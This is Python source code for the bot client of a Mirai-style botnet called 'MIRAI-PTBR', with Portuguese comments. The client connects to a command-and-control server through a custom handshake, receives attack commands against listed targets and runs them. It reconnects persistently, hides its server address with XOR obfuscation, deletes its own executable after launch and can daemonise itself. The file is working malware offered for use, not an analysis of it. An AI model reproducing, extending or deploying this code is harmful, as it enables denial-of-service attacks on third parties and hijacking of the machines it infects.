#!/usr/bin/env python3
"""
MIRAI-PTBR BOT v1.0
Bot que conecta ao CNC, recebe comandos e executa ataques.
Recursos:
  - Conexão TCP persistente com CNC
  - Protocolo binário (handshake + comandos)
  - Heartbeat automático
  - Execução de ataques via AttackRunner
  - Auto-proteção básica (single instance, watchdog)
  - Ofuscação de strings (XOR com chave)
"""

import socket
import struct
import sys
import os
import time
import json
import platform
import uuid
import signal
import logging
import threading
from pathlib import Path

# Importa protocolo e ataques
sys.path.insert(0, str(Path(__file__).parent.parent))
from cnc.protocol import AttackCommand, AttackType, Target, Option
from attacks.main import AttackRunner, execute_attack, stop_attack

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] BOT - %(levelname)s: %(message)s'
)
log = logging.getLogger('bot')


class Obfuscation:
    """Ofuscação de strings estilo Mirai (XOR com chave)."""
    
    KEY = 0xDEADBEEF
    
    @staticmethod
    def obfuscate(s: str) -> bytes:
        """Ofusca uma string com XOR."""
        result = bytearray()
        for i, c in enumerate(s.encode()):
            key_byte = (Obfuscation.KEY >> ((i % 4) * 8)) & 0xFF
            result.append(c ^ key_byte)
        return bytes(result)
    
    @staticmethod
    def deobfuscate(data: bytes) -> str:
        """Revela uma string ofuscada."""
        result = bytearray()
        for i, b in enumerate(data):
            key_byte = (Obfuscation.KEY >> ((i % 4) * 8)) & 0xFF
            result.append(b ^ key_byte)
        return result.decode('utf-8', errors='replace')


class Bot:
    """Bot principal — conecta ao CNC e executa comandos."""
    
    def __init__(self, cnc_host: str = None, cnc_port: int = 48101,
                 bot_id: str = None):
        """
        Args:
            cnc_host: IP do CNC (se None, lê de config ou ofuscação)
            cnc_port: Porta do CNC
            bot_id: ID único do bot (se None, auto-gera)
        """
        self.cnc_host = cnc_host or self._get_cnc_host()
        self.cnc_port = cnc_port
        self.bot_id = bot_id or self._generate_bot_id()
        
        self.sock = None
        self.running = False
        self.attack_runner = AttackRunner()
        self._lock = threading.Lock()
        
        # Auto-proteção
        self._ensure_single_instance()
        self._setup_signal_handlers()
    
    def _get_cnc_host(self) -> str:
        """Tenta obter CNC host de várias fontes."""
        # 1. Arquivo de config ofuscado
        config_path = Path('/tmp/.bot_config')
        if config_path.exists():
            try:
                data = config_path.read_bytes()
                return Obfuscation.deobfuscate(data)
            except:
                pass
        
        # 2. Variável de ambiente
        env_host = os.environ.get('CNC_HOST')
        if env_host:
            return env_host
        
        # 3. Default (será substituído durante o build)
        return '127.0.0.1'
    
    def _generate_bot_id(self) -> str:
        """Gera um ID único para o bot."""
        # Combina informações do sistema para criar ID único
        system_info = [
            platform.node(),
            str(uuid.getnode()),  # MAC address
            platform.machine(),
            platform.processor(),
        ]
        raw = "-".join(system_info)
        # Hash simples
        import hashlib
        hashed = hashlib.md5(raw.encode()).hexdigest()[:12]
        return f"BOT-{hashed}-{platform.machine()[:4]}"
    
    def _ensure_single_instance(self):
        """Garante que apenas uma instância do bot roda."""
        lock_file = Path('/tmp/.bot_lock')
        try:
            if lock_file.exists():
                pid = lock_file.read_text().strip()
                if pid:
                    try:
                        os.kill(int(pid), 0)  # Verifica se processo existe
                        log.warning("[!] Bot já está rodando (PID: %s). Saindo.", pid)
                        sys.exit(1)
                    except ProcessLookupError:
                        pass  # PID antigo, pode prosseguir
            
            lock_file.write_text(str(os.getpid()))
            # Remove lock ao sair
            atexit.register(lambda: lock_file.unlink(missing_ok=True))
        except Exception as e:
            log.warning("[!] Erro ao verificar instância única: %s", e)
    
    def _setup_signal_handlers(self):
        """Configura handlers para sinais do sistema."""
        def signal_handler(sig, frame):
            log.info("[*] Recebido sinal %s. Encerrando...", sig)
            self.stop()
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
    
    def connect(self) -> bool:
        """Conecta ao CNC e faz handshake."""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(10)
            self.sock.connect((self.cnc_host, self.cnc_port))
            
            # Handshake: [MAGIC:4][ID_LEN:1][ID...]
            bot_id_bytes = self.bot_id.encode('utf-8')
            handshake = b'MIRA' + bytes([len(bot_id_bytes)]) + bot_id_bytes
            self.sock.sendall(handshake)
            
            # Aguarda confirmação
            response = self.sock.recv(1)
            if response == b'\x01':
                log.info("[+] Handshake OK! Conectado ao CNC %s:%s como %s",
                         self.cnc_host, self.cnc_port, self.bot_id)
                return True
            else:
                log.error("[!] Handshake falhou: resposta %r", response)
                return False
                
        except Exception as e:
            log.error("[!] Erro ao conectar: %s", e)
            return False
    
    def reconnect(self):
        """Tenta reconectar com backoff exponencial."""
        backoff = 1
        max_backoff = 60
        
        while self.running:
            log.info("[*] Tentando reconectar em %ds...", backoff)
            time.sleep(backoff)
            
            if self.connect():
                return True
            
            backoff = min(backoff * 2, max_backoff)
        
        return False
    
    def run(self):
        """Loop principal do bot."""
        self.running = True
        
        # Conecta ao CNC
        if not self.connect():
            if not self.reconnect():
                log.error("[!] Não foi possível conectar ao CNC")
                return
        
        # Inicia thread de heartbeat
        heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        heartbeat_thread.start()
        
        # Loop de comandos
        buffer = b""
        expected_len = 0
        
        while self.running:
            try:
                data = self.sock.recv(4096)
                if not data:
                    log.warning("[!] Conexão perdida")
                    break
                
                buffer += data
                
                # Processa mensagens completas
                while len(buffer) >= 4:
                    if expected_len == 0:
                        expected_len = struct.unpack('!I', buffer[:4])[0]
                        buffer = buffer[4:]
                    
                    if len(buffer) >= expected_len:
                        cmd_data = buffer[:expected_len]
                        buffer = buffer[expected_len:]
                        expected_len = 0
                        
                        # Processa comando
                        self._handle_command(cmd_data)
                    else:
                        break  # Aguarda mais dados
                        
            except socket.timeout:
                continue
            except (ConnectionResetError, ConnectionAbortedError, OSError) as e:
                log.warning("[!] Erro de conexão: %s", e)
                break
        
        # Tenta reconectar
        if self.running:
            self.sock.close()
            self.reconnect()
    
    def _handle_command(self, data: bytes):
        """Processa um comando recebido do CNC."""
        try:
            # Verifica se é ping/heartbeat
            if data == b'\x00':
                self._send_ack(0x03)  # Heartbeat reply
                return
            
            # Parse do comando de ataque
            cmd = AttackCommand.unpack(data)
            log.info("[*] Comando recebido: %s -> %s por %ds",
                     cmd.attack_type.name, cmd.targets, cmd.duration)
            
            # Confirma recebimento
            self._send_ack(0x01)  # ACK
            
            # Executa ataque em thread separada
            attack_thread = threading.Thread(
                target=self._execute_attack_wrapper,
                args=(cmd,),
                daemon=True
            )
            attack_thread.start()
            
        except Exception as e:
            log.error("[!] Erro ao processar comando: %s", e)
    
    def _execute_attack_wrapper(self, cmd: AttackCommand):
        """Wrapper para executar ataque e notificar conclusão."""
        try:
            success = execute_attack(cmd)
            if success:
                # Aguarda até o fim do ataque
                duration = cmd.duration
                time.sleep(duration + 1)
                # Notifica conclusão
                self._send_ack(0x02)  # Attack completed
                log.info("[*] Ataque concluído: %s", cmd.attack_type.name)
        except Exception as e:
            log.error("[!] Erro na execução do ataque: %s", e)
    
    def _send_ack(self, ack_type: int):
        """Envia ACK para o CNC."""
        try:
            with self._lock:
                if self.sock:
                    self.sock.sendall(bytes([ack_type]))
        except:
            pass
    
    def _heartbeat_loop(self):
        """Loop de heartbeat (responde a pings do CNC)."""
        while self.running:
            time.sleep(30)
            # O CNC envia \x00 como ping
            # A resposta é tratada em _handle_command
    
    def stop(self):
        """Para o bot."""
        self.running = False
        stop_attack()
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
        log.info("[*] Bot encerrado.")


def main():
    """Entry point do bot."""
    import argparse
    
    parser = argparse.ArgumentParser(description='MIRAI-PTBR Bot')
    parser.add_argument('--cnc', help='CNC host (IP ou domínio)', default=None)
    parser.add_argument('--port', type=int, help='CNC port', default=48101)
    parser.add_argument('--id', help='Bot ID', default=None)
    parser.add_argument('--daemon', action='store_true', help='Rodar como daemon')
    
    args = parser.parse_args()
    
    # Auto-delete (Mirai-style): apaga o próprio binário após execução
    try:
        if getattr(sys, 'frozen', False):
            # Se for executável PyInstaller
            os.unlink(sys.executable)
        else:
            # Se for script Python
            pass  # Não apaga script fonte
    except:
        pass
    
    bot = Bot(
        cnc_host=args.cnc,
        cnc_port=args.port,
        bot_id=args.id
    )
    
    if args.daemon:
        # Daemoniza o processo
        pid = os.fork()
        if pid > 0:
            sys.exit(0)  # Processo pai sai
    
    # Executa bot (com reconexão automática)
    while True:
        try:
            bot.run()
        except KeyboardInterrupt:
            bot.stop()
            break
        except Exception as e:
            log.error("[!] Erro fatal: %s. Reiniciando...", e)
            time.sleep(5)


if __name__ == '__main__':
    # Importa atexit para o lock file
    import atexit
    main()
